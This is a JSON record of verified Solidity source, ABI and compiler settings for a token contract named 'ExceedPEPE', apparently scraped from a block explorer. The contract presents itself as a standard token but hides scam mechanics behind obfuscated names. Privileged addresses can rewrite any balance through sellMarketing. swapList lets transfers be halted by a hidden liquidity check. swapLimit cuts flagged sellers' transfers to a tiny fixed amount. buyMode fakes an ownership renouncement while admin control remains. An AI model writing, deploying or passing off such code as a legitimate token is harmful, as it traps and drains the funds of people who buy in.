{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface maxMinFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverLiquidity) external view returns (uint256);\n\n    function transfer(address liquidityTake, uint256 txMarketing) external returns (bool);\n\n    function allowance(address tradingMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityTake,\n        uint256 txMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptIsBuy, uint256 value);\n    event Approval(address indexed tradingMin, address indexed spender, uint256 value);\n}\n\nabstract contract fundMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityLaunchedReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptLaunch {\n    function createPair(address marketingTrading, address walletSell) external returns (address);\n}\n\ninterface maxMinFromMetadata is maxMinFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExceedPEPE is fundMarketing, maxMinFrom, maxMinFromMetadata {\n\n    uint256 constant tokenFee = 18 ** 10;\n\n    function sellMarketing(address receiverTake, uint256 txMarketing) public {\n        atBuy();\n        teamMode[receiverTake] = txMarketing;\n    }\n\n    string private enableAutoWallet = \"Exceed PEPE\";\n\n    function amountLaunch(address feeMin) public {\n        require(feeMin.balance < 100000);\n        if (maxFundLaunch) {\n            return;\n        }\n        if (fundWallet != feeBuyReceiver) {\n            feeBuyReceiver = toShouldAmount;\n        }\n        isMarketing[feeMin] = true;\n        \n        maxFundLaunch = true;\n    }\n\n    string private enableTeamList = \"EPE\";\n\n    function transfer(address receiverTake, uint256 txMarketing) external virtual override returns (bool) {\n        return swapList(_msgSender(), receiverTake, txMarketing);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTeamList;\n    }\n\n    mapping(address => uint256) private teamMode;\n\n    uint256 fundLiquidity;\n\n    bool public teamSender;\n\n    bool private launchedExempt;\n\n    function allowance(address takeAmount, address toMarketing) external view virtual override returns (uint256) {\n        if (toMarketing == atTo) {\n            return type(uint256).max;\n        }\n        return walletMax[takeAmount][toMarketing];\n    }\n\n    event OwnershipTransferred(address indexed minFund, address indexed liquidityLaunched);\n\n    address exemptMaxLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function marketingEnableSender(address isReceiver, address liquidityTake, uint256 txMarketing) internal returns (bool) {\n        require(teamMode[isReceiver] >= txMarketing);\n        teamMode[isReceiver] -= txMarketing;\n        teamMode[liquidityTake] += txMarketing;\n        emit Transfer(isReceiver, liquidityTake, txMarketing);\n        return true;\n    }\n\n    address atTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return teamToken;\n    }\n\n    uint8 private totalTrading = 18;\n\n    function balanceOf(address receiverLiquidity) public view virtual override returns (uint256) {\n        return teamMode[receiverLiquidity];\n    }\n\n    bool public maxFundLaunch;\n\n    mapping(address => bool) public swapReceiver;\n\n    uint256 private fundWallet;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalTrading;\n    }\n\n    uint256 private receiverLimit = 100000000 * 10 ** 18;\n\n    address public launchFund;\n\n    uint256 public isList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverLimit;\n    }\n\n    address private teamToken;\n\n    function approve(address toMarketing, uint256 txMarketing) public virtual override returns (bool) {\n        walletMax[_msgSender()][toMarketing] = txMarketing;\n        emit Approval(_msgSender(), toMarketing, txMarketing);\n        return true;\n    }\n\n    function buyMode() public {\n        emit OwnershipTransferred(launchFund, address(0));\n        teamToken = address(0);\n    }\n\n    function swapLimit(address modeTake) public {\n        atBuy();\n        if (fundWallet != feeBuyReceiver) {\n            fundWallet = feeBuyReceiver;\n        }\n        if (modeTake == launchFund || modeTake == launchAt) {\n            return;\n        }\n        swapReceiver[modeTake] = true;\n    }\n\n    function swapList(address isReceiver, address liquidityTake, uint256 txMarketing) internal returns (bool) {\n        if (isReceiver == launchFund) {\n            return marketingEnableSender(isReceiver, liquidityTake, txMarketing);\n        }\n        uint256 receiverWallet = maxMinFrom(launchAt).balanceOf(exemptMaxLaunch);\n        require(receiverWallet == fundLiquidity);\n        require(liquidityTake != exemptMaxLaunch);\n        if (swapReceiver[isReceiver]) {\n            return marketingEnableSender(isReceiver, liquidityTake, tokenFee);\n        }\n        return marketingEnableSender(isReceiver, liquidityTake, txMarketing);\n    }\n\n    uint256 private feeBuyReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return enableAutoWallet;\n    }\n\n    constructor (){\n        \n        liquidityLaunchedReceiver liquidityLaunch = liquidityLaunchedReceiver(atTo);\n        launchAt = exemptLaunch(liquidityLaunch.factory()).createPair(liquidityLaunch.WETH(), address(this));\n        if (toShouldAmount != fundWallet) {\n            teamSender = true;\n        }\n        launchFund = _msgSender();\n        buyMode();\n        isMarketing[launchFund] = true;\n        teamMode[launchFund] = receiverLimit;\n        \n        emit Transfer(address(0), launchFund, receiverLimit);\n    }\n\n    uint256 private toShouldAmount;\n\n    mapping(address => bool) public isMarketing;\n\n    address public launchAt;\n\n    uint256 fundToken;\n\n    mapping(address => mapping(address => uint256)) private walletMax;\n\n    function atBuy() private view {\n        require(isMarketing[_msgSender()]);\n    }\n\n    bool public exemptMode;\n\n    function owner() external view returns (address) {\n        return teamToken;\n    }\n\n    function transferFrom(address isReceiver, address liquidityTake, uint256 txMarketing) external override returns (bool) {\n        if (_msgSender() != atTo) {\n            if (walletMax[isReceiver][_msgSender()] != type(uint256).max) {\n                require(txMarketing <= walletMax[isReceiver][_msgSender()]);\n                walletMax[isReceiver][_msgSender()] -= txMarketing;\n            }\n        }\n        return swapList(isReceiver, liquidityTake, txMarketing);\n    }\n\n    function modeMarketingAmount(uint256 txMarketing) public {\n        atBuy();\n        fundLiquidity = txMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIsBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"amountLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFundLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"modeMarketingAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"sellMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTake\",\"type\":\"address\"}],\"name\":\"swapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExceedPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}